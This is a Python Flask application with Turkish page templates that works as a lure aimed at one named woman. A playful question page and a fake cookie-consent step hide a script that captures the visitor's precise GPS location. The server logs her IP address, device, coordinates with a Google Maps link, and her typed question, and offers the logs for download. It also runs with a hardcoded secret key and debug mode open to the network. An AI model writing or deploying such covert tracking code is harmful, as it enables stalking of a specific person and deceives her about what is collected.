from flask import Flask, request, render_template_string, send_file, session, redirect, url_for
import sqlite3
import json
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'melikeeslemgüler'  # Session için gizli anahtar

# Veritabanı başlatma
def init_db():
    conn = sqlite3.connect('visitors.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS visitors
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ip TEXT, user_agent TEXT, latitude REAL, longitude REAL, accuracy REAL, timestamp TEXT, method TEXT, question TEXT)''')
    conn.commit()
    conn.close()

# konum.json dosyasına yazma
def save_to_json(data):
    try:
        if os.path.exists('konum.json'):
            with open('konum.json', 'r') as f:
                existing_data = json.load(f)
        else:
            existing_data = []

        existing_data.append(data)
        with open('konum.json', 'w') as f:
            json.dump(existing_data, f, indent=4)
    except Exception as e:
        print(f"JSON Kaydetme Hatası: {e}")

# Giriş ekranı şablonu
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96c93d);
            background-size: 400%;
            animation: gradient 15s ease infinite;
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            text-align: center;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        input[type="text"] {
            padding: 10px;
            width: 250px;
            border: none;
            border-radius: 5px;
            margin-bottom: 15px;
            font-size: 1em;
        }
        button {
            padding: 10px 20px;
            background-color: #ff6b6b;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 1em;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #e55a5a;
        }
        .error {
            color: #ff4d4d;
            margin-top: 10px;
            font-size: 1em;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Giriş Yap</h1>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="İsminizi girin" required>
            <br>
            <button type="submit">Giriş Yap</button>
        </form>
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}
    </div>
</body>
</html>
"""

# Kurabiye ekranı şablonu
COOKIE_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kurabiyeleri Kabul Et</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96c93d);
            background-size: 400%;
            animation: gradient 15s ease infinite;
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            text-align: center;
        }
        h1 {
            font-size: 2em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        button {
            padding: 10px 20px;
            background-color: #4ecdc4;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 1em;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #3dbab3;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Bu site, için kurabiyeleri kabul edin lütfen bayan Meg.<br>Kurabiyeleri kabul ediyor musunuz?</h1>
        <form method="POST" action="/accept_cookies">
            <button type="submit">Kurabiyeleri Kabul Et</button>
        </form>
    </div>
</body>
</html>
"""

# Ana sayfa şablonu
MAIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Soru Sor</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96c93d);
            background-size: 400%;
            animation: gradient 15s ease infinite;
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            text-align: center;
        }
        h1 {
            font-size: 2em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        textarea {
            width: 300px;
            height: 100px;
            padding: 10px;
            border: none;
            border-radius: 5px;
            margin-bottom: 15px;
            font-size: 1em;
            resize: none;
        }
        button {
            padding: 10px 20px;
            background-color: #96c93d;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 1em;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #85b32f;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Yalan Söylemiyecek Olsam Bana Hangi Soruyu Sorardın?</h1>
        <form method="POST" action="/submit_question">
            <textarea name="question" placeholder="Sorunuzu buraya yazın" required></textarea>
            <br>
            <button type="submit">Gönder</button>
        </form>
    </div>

    <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    fetch('/save_location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: accuracy })
                    });
                },
                error => {
                    fetch('/save_location_error', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ error: error.message })
                    });
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            fetch('/save_location_error', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ error: "Tarayıcı konum servislerini desteklemiyor." })
            });
        }
    </script>
</body>
</html>
"""

# Giriş ekranı
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        if username.lower() == "melike eslem güler":
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('cookies'))
        else:
            return render_template_string(LOGIN_TEMPLATE, error="Lütfen Mes’den şifre isteyin")
    return render_template_string(LOGIN_TEMPLATE)

# Kurabiye ekranı
@app.route('/cookies', methods=['GET', 'POST'])
def cookies():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(COOKIE_TEMPLATE)

# Kurabiyeleri kabul etme
@app.route('/accept_cookies', methods=['POST'])
def accept_cookies():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    session['cookies_accepted'] = True

    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    print(f"\n=== Yeni Ziyaretçi ===")
    print(f"Ziyaretçi IP: {client_ip}")
    print(f"Tarayıcı/Cihaz: {user_agent}")
    print(f"Zaman: {timestamp}")
    print(f"Kullanıcı: {session.get('username')}")

    return redirect(url_for('main'))

# Ana sayfa
@app.route('/main')
def main():
    if not session.get('logged_in') or not session.get('cookies_accepted'):
        return redirect(url_for('login'))
    return render_template_string(MAIN_TEMPLATE)

# Konumu kaydet
@app.route('/save_location', methods=['POST'])
def save_location():
    try:
        data = request.get_json()
        latitude = data['latitude']
        longitude = data['longitude']
        accuracy = data['accuracy']
        client_ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Google Maps linki oluştur
        maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"

        # Terminalde göster
        print(f"Hassas Konum (HTML5): Enlem {latitude}, Boylam {longitude}")
        print(f"Sapma: {accuracy} metre")
        print(f"Harita: {maps_url}")
        if accuracy > 100:
            print("UYARI: Sapma değeri yüksek! Daha doğru konum için: GPS/Wi-Fi açık olmalı, açık alanda test yapılmalı.")

        # konum.json dosyasına kaydet
        location_data = {
            "ip": client_ip,
            "latitude": latitude,
            "longitude": longitude,
            "accuracy_meters": accuracy,
            "maps_url": maps_url,
            "timestamp": timestamp,
            "method": "HTML5 Geolocation",
            "username": session.get('username')
        }
        save_to_json(location_data)

        # Veritabanına kaydet
        conn = sqlite3.connect('visitors.db')
        c = conn.cursor()
        c.execute("INSERT INTO visitors (ip, user_agent, latitude, longitude, accuracy, timestamp, method) VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (client_ip, request.headers.get('User-Agent'), latitude, longitude, accuracy, timestamp, "HTML5 Geolocation"))
        conn.commit()
        conn.close()

        return 'Konum alındı'
    except Exception as e:
        print(f"Konum Hata: {e}")
        return 'Konum alınamadı', 400

# Konum hatasını kaydet
@app.route('/save_location_error', methods=['POST'])
def save_location_error():
    try:
        data = request.get_json()
        error_message = data['error']
        print(f"Konum Alınamadı: {error_message}")
        return 'Hata alındı'
    except Exception as e:
        print(f"Hata Kaydetme Hatası: {e}")
        return 'Hata alınamadı', 400

# Soruyu kaydet
@app.route('/submit_question', methods=['POST'])
def submit_question():
    if not session.get('logged_in') or not session.get('cookies_accepted'):
        return redirect(url_for('login'))
    
    question = request.form['question']
    client_ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Loglara yaz
    print(f"Kullanıcı: {session.get('username')}")
    print(f"Soru: {question}")
    print(f"Zaman: {timestamp}")

    # konum.json’a soruyu ekle
    location_data = {
        "ip": client_ip,
        "question": question,
        "timestamp": timestamp,
        "username": session.get('username')
    }
    save_to_json(location_data)

    # Veritabanına soruyu ekle
    conn = sqlite3.connect('visitors.db')
    c = conn.cursor()
    c.execute("UPDATE visitors SET question = ? WHERE ip = ? AND timestamp = ?",
              (question, client_ip, timestamp))
    conn.commit()
    conn.close()

    return redirect(url_for('main'))

# Dosya indirme rotası
@app.route('/download/<filename>')
def download_file(filename):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    if filename in ['konum.json', 'visitors.db']:
        return send_file(filename, as_attachment=True)
    return "Dosya bulunamadı", 404

if __name__ == '__main__':
    init_db()  # Veritabanını başlat
    app.run(host='0.0.0.0', port=5000, debug=True)